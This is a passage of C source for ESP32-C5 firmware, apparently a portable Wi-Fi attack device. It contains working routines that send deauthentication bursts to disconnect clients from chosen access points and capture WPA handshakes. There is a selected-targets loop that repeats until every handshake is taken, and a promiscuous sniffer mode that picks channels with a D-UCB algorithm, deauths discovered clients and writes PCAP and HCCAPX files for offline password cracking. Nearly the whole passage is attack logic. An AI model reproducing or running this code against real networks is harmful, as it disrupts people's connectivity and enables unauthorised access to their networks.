Smethan/projectZero/ESP32C5/main/main.c
    MY_LOG_INFO(TAG, "Channel scan complete");
}

// Attack network with deauth burst (5 packets)
static void attack_network_with_burst(const wifi_ap_record_t *ap) {
    MY_LOG_INFO(TAG, "Burst attacking '%s' (Ch %d, RSSI: %d dBm)", 
                ap->ssid, ap->primary, ap->rssi);
    
    char burst_l2[64], burst_l3[64];
    snprintf(burst_l2, sizeof(burst_l2), ">> %s", (const char *)ap->ssid);
    snprintf(burst_l3, sizeof(burst_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
    
    // Start attack on this network
    attack_handshake_start(ap, ATTACK_HANDSHAKE_METHOD_BROADCAST);
    
    // Wait and check for handshake - 3 deauth bursts with 3s wait each
    for (int burst = 0; burst < 3 && handshake_attack_active && !operation_stop_requested; burst++) {
        {
            char burst_l4[64];
            snprintf(burst_l4, sizeof(burst_l4), "  Burst %d/3 ...", burst + 1);
            oled_display_update_full("> WPA Capture", burst_l2, burst_l3, burst_l4);
        }
        
        // Wait 3 seconds for clients to reconnect after deauth
        for (int i = 0; i < 30 && handshake_attack_active && !operation_stop_requested; i++) {
            vTaskDelay(pdMS_TO_TICKS(100));
            
            if (i == 15) {
                oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  Listening...");
            }
            
            // Check if handshake captured
            if (attack_handshake_is_complete()) {
                MY_LOG_INFO(TAG, "✓ Handshake captured for '%s' after burst #%d!", 
                           ap->ssid, burst + 1);
                oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  >> CAPTURED!");
                
                // Wait 2s to capture any remaining frames
                vTaskDelay(pdMS_TO_TICKS(2000));
                attack_handshake_stop();
                return; // Success!
            }
        }
        
        MY_LOG_INFO(TAG, "Burst #%d complete, trying next...", burst + 1);
    }
    
    // No handshake captured after 3 bursts
    MY_LOG_INFO(TAG, "✗ No handshake for '%s' after 3 bursts", ap->ssid);
    oled_display_update_full("> WPA Capture", burst_l2, burst_l3, "  No handshake");
    attack_handshake_stop();
}

// ============================================================================
// Handshake Attack Task: Selected Networks Mode (unchanged logic)
// ============================================================================
static void handshake_attack_task_selected(void) {
    MY_LOG_INFO(TAG, "===== Selected Networks Mode =====");
    MY_LOG_INFO(TAG, "Attacking %d selected networks in loop until all captured", handshake_target_count);
    
    while (handshake_attack_active && !operation_stop_requested) {
        // Check if we're done
        bool all_captured = true;
        for (int i = 0; i < handshake_target_count; i++) {
            if (!handshake_captured[i]) { all_captured = false; break; }
        }
        if (all_captured) {
            MY_LOG_INFO(TAG, "All selected networks captured! Attack complete.");
            {
                char hs_l3[64];
                snprintf(hs_l3, sizeof(hs_l3), "  %d handshakes", handshake_target_count);
                oled_display_update_full("> WPA Capture", "  All done!", hs_l3, "  Complete!");
            }
            break;
        }
        
        int attacked_count = 0;
        int captured_count = 0;
        
        for (int i = 0; i < handshake_target_count && handshake_attack_active && !operation_stop_requested; i++) {
            wifi_ap_record_t *ap = &handshake_targets[i];
            if (handshake_captured[i]) continue;
            
            if (check_handshake_file_exists((const char*)ap->ssid)) {
                handshake_captured[i] = true;
                captured_count++;
                continue;
            }
            
            attacked_count++;
            MY_LOG_INFO(TAG, ">>> [%d/%d] Attacking '%s' (Ch %d, RSSI: %d dBm) <<<",
                       i + 1, handshake_target_count, (const char*)ap->ssid, ap->primary, ap->rssi);
            
            {
                char hs_l1[64], hs_l2[64], hs_l3[64];
                snprintf(hs_l1, sizeof(hs_l1), "> WPA [%d/%d]", i + 1, handshake_target_count);
                snprintf(hs_l2, sizeof(hs_l2), ">> %s", (const char *)ap->ssid);
                snprintf(hs_l3, sizeof(hs_l3), "  Ch %d  %ddB", ap->primary, ap->rssi);
                oled_display_update_full(hs_l1, hs_l2, hs_l3, "  Attacking...");
            }
            
            attack_network_with_burst(ap);
            
            if (attack_handshake_is_complete()) {
                handshake_captured[i] = true;
                captured_count++;
                MY_LOG_INFO(TAG, "Handshake #%d captured!", captured_count);
            }
            
            if (i < handshake_target_count - 1) {
                vTaskDelay(pdMS_TO_TICKS(2000));
            }
        }
        
        MY_LOG_INFO(TAG, "Cycle: attacked=%d, captured=%d", attacked_count, captured_count);
        
        bool all_done = true;
        int remaining = 0;
        for (int i = 0; i < handshake_target_count; i++) {
            if (!handshake_captured[i]) { all_done = false; remaining++; }
        }
        if (all_done) {
            MY_LOG_INFO(TAG, "All selected networks captured!");
            {
                char hs_l3[64];
                snprintf(hs_l3, sizeof(hs_l3), "  %d handshakes", handshake_target_count);
                oled_display_update_full("> WPA Capture", "  All done!", hs_l3, "  Complete!");
            }
            break;
        }
        {
            char hs_l3[64], hs_l4[64];
            snprintf(hs_l3, sizeof(hs_l3), "  Cap:%d Rem:%d", captured_count, remaining);
            snprintf(hs_l4, sizeof(hs_l4), "  Next cycle...");
            oled_display_update_full("> WPA Capture", "  Cycle done", hs_l3, hs_l4);
        }
        MY_LOG_INFO(TAG, "%d networks remaining, repeating...", remaining);
        vTaskDelay(pdMS_TO_TICKS(3000));
    }
}

// ============================================================================
// Handshake Attack Task: Sniffer + D-UCB Mode (new scan-all replacement)
// ============================================================================
static void handshake_attack_task_sniffer(void) {
    MY_LOG_INFO(TAG, "===== Sniffer + D-UCB Mode =====");
    MY_LOG_INFO(TAG, "Promiscuous sniffer with D-UCB channel selection");
    MY_LOG_INFO(TAG, "Targeted deauth on discovered clients");
    MY_LOG_INFO(TAG, "Channels: %d (2.4GHz + 5GHz)", dual_band_channels_count);
    MY_LOG_INFO(TAG, "D-UCB gamma=%.3f, c=%.1f, dwell=%dms", DUCB_GAMMA, DUCB_C, HS_DWELL_TIME_MS);
    
    // 1. Initialize D-UCB
    ducb_init();
    
    // 2. Reset sniffer state
    hs_ap_count = 0;
    hs_client_count = 0;
    memset(hs_ap_targets, 0, HS_MAX_APS * sizeof(hs_ap_target_t));
    memset(hs_clients, 0, HS_MAX_CLIENTS * sizeof(hs_client_entry_t));
    
    // 3. Initialize PCAP + HCCAPX serializers
    pcap_serializer_init();
    hccapx_serializer_init((const uint8_t *)"", 0); // Will be re-inited per-AP as needed
    
    // 4. Set up promiscuous mode with our callback
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(hs_sniffer_promiscuous_cb);
    esp_wifi_set_promiscuous(true);
    
    MY_LOG_INFO(TAG, "Promiscuous mode enabled. Sniffing...");
    // Tab5 parses: strstr("PHASE") && strstr("Attack")
    MY_LOG_INFO(TAG, "===== PHASE: Sniffer Attack (D-UCB) =====");
    // Tab5 parses: strstr("Scanning") for progress
    MY_LOG_INFO(TAG, "Scanning all channels via D-UCB...");
    
    int64_t last_stats_time = esp_timer_get_time();
    int total_handshakes_captured = 0;
    
    // 5. Main D-UCB loop
    while (handshake_attack_active && !operation_stop_requested) {
        // Select channel via D-UCB
        int ch_idx = ducb_select_channel();
        int channel = ducb_channels[ch_idx].channel;
        
        // Switch channel
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        {
            char hss_l2[64], hss_l3[64], hss_l4[64];
            snprintf(hss_l2, sizeof(hss_l2), "  Scan Ch %d", channel);
            snprintf(hss_l3, sizeof(hss_l3), "  AP:%d Cli:%d", hs_ap_count, hs_client_count);
            snprintf(hss_l4, sizeof(hss_l4), "  Cap:%d D-UCB", total_handshakes_captured);
            oled_display_update_full("> WPA Sniffer", hss_l2, hss_l3, hss_l4);
        }
        
